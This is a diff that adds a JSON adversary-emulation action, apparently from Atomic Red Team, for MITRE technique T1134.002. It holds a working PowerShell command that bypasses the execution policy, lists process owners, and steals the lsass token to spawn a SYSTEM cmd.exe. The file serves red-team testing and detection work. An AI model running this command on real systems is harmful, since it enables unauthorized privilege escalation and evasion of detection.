@@ -1,0 +1,25 @@
+{
+    "name": "Access Token Manipulation",
+    "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner.  Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity.  This Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n& \"$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1134.002",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Create Process with Token",
+    "source": "ART",
+    "uuid": "dbf4f5a9-b8e0-46a3-9841-9ad71247239e",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
